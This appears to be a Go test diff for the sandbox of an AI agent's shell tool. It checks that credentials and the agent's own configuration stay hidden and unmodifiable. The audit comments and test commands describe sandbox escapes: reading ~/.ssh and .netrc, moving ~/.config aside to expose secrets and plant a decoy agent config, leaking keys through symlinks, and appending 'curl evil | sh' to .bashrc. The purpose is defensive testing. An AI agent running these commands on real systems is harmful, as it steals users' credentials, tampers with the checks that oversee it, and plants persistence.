@@ -228,3 +228,80 @@ func TestReadPathsAndHome(t *testing.T) {
 		t.Fatalf("got\n%s\nwant\n%s", out, want)
 	}
 }
+
+// 21/11: a home of two million entries was walked at every command,
+// refused past one million, and refused whole for holding the agent's own
+// configuration: no sandboxed command ever ran with the home granted. A
+// Read directory now hides its secrets where they lie, and the protected
+// paths in it, without walking; commands run.
+func TestAHomeIsReadWithItsSecretsHidden(t *testing.T) {
+	box := boxOrSkip(t)
+	home := t.TempDir()
+	write(t, home, map[string]string{"lib/a.txt": "hello", ".ssh/id_rsa": "KEY", ".config/ringil/state": "STATE", ".netrc": "NETRC"})
+	tl := newBash(t, Config{Dir: t.TempDir(), Sandbox: box, Read: []string{home}, Home: home, Never: []string{filepath.Join(home, ".config", "ringil")}})
+	out, _ := call(t, tl, map[string]any{"command": "cat ~/lib/a.txt; cat " + home + "/.ssh/id_rsa " + home + "/.netrc " + home + "/.config/ringil/state 2>&1; echo \"[$XDG_CACHE_HOME]\""})
+	if !strings.Contains(out, "hello") || strings.Contains(out, "KEY") || strings.Contains(out, "NETRC") || strings.Contains(out, "STATE") || !strings.Contains(out, "[/tmp/.cache]") {
+		t.Fatalf("%q", out)
+	}
+}
+
+// Audit 21/11 (1): in a home granted writable, a command moved ~/.config
+// aside, which uncovered the secrets hidden in it, and planted a decoy of
+// the agent's configuration. The directories above a hidden path are
+// pinned: they cannot be moved.
+func TestAWritableHomeKeepsItsHiddenPathsHidden(t *testing.T) {
+	box := boxOrSkip(t)
+	home := t.TempDir()
+	write(t, home, map[string]string{".config/gh/hosts.yml": "GHTOKEN", ".config/ringil/state": "STATE", ".local/share/keyrings/login": "KEYRING", "notes.txt": "ok"})
+	tl := newBash(t, Config{Dir: home, Home: home, Sandbox: box, Read: []string{}, Never: []string{filepath.Join(home, ".config", "ringil")}})
+	_, _ = call(t, tl, map[string]any{"command": "mv ~/.config ~/c; mv ~/.local ~/l; mkdir -p ~/.config/ringil && echo PLANTED > ~/.config/ringil/x"})
+	out, _ := call(t, tl, map[string]any{"command": "cat ~/c/gh/hosts.yml ~/c/ringil/state ~/l/share/keyrings/login ~/.config/gh/hosts.yml ~/.config/ringil/state 2>&1; cat ~/notes.txt"})
+	if strings.Contains(out, "GHTOKEN") || strings.Contains(out, "STATE") || strings.Contains(out, "KEYRING") || !strings.Contains(out, "ok") {
+		t.Fatalf("%q", out)
+	}
+	if data, err := os.ReadFile(filepath.Join(home, ".config", "ringil", "state")); err != nil || string(data) != "STATE" {
+		t.Fatalf("the agent's configuration was moved: %q %v", data, err)
+	}
+	if _, err := os.Stat(filepath.Join(home, ".config", "ringil", "x")); !os.IsNotExist(err) {
+		t.Fatal("a decoy was planted")
+	}
+}
+
+// Audit 21/11 (2): a secret directory that is a link (~/.ssh ->
+// dotfiles/ssh) showed its keys through the link. What it points to is
+// hidden too.
+func TestASecretLinkHidesItsTarget(t *testing.T) {
+	box := boxOrSkip(t)
+	home := t.TempDir()
+	write(t, home, map[string]string{"dotfiles/ssh/id_ed25519": "SSHKEY", "dotfiles/gh/hosts.yml": "GHTOKEN", "dotfiles/vimrc": "ok"})
+	if err := os.Symlink("dotfiles/ssh", filepath.Join(home, ".ssh")); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.MkdirAll(filepath.Join(home, ".config"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink("../dotfiles/gh", filepath.Join(home, ".config", "gh")); err != nil {
+		t.Fatal(err)
+	}
+	tl := newBash(t, Config{Dir: t.TempDir(), Home: home, Sandbox: box, Read: []string{home}})
+	out, _ := call(t, tl, map[string]any{"command": "cat ~/.ssh/id_ed25519 ~/.config/gh/hosts.yml ~/dotfiles/ssh/id_ed25519 ~/dotfiles/gh/hosts.yml 2>&1; cat ~/dotfiles/vimrc"})
+	if strings.Contains(out, "SSHKEY") || strings.Contains(out, "GHTOKEN") || !strings.Contains(out, "ok") {
+		t.Fatalf("%q", out)
+	}
+}
+
+// Audit 21/11 (4): in a home granted writable, the shell's startup files
+// are code the host runs at the next login: read-only to commands.
+func TestStartupFilesStayAsTheyAre(t *testing.T) {
+	box := boxOrSkip(t)
+	home := t.TempDir()
+	write(t, home, map[string]string{".bashrc": "# mine\n", ".config/autostart/a.desktop": "x"})
+	tl := newBash(t, Config{Dir: home, Home: home, Sandbox: box, Read: []string{}})
+	_, _ = call(t, tl, map[string]any{"command": "echo 'curl evil | sh' >> ~/.bashrc; echo y > ~/.config/autostart/b.desktop"})
+	if data, _ := os.ReadFile(filepath.Join(home, ".bashrc")); string(data) != "# mine\n" {
+		t.Fatalf("%q", data)
+	}
+	if _, err := os.Stat(filepath.Join(home, ".config", "autostart", "b.desktop")); !os.IsNotExist(err) {
+		t.Fatal("an autostart entry was added")
+	}
+}
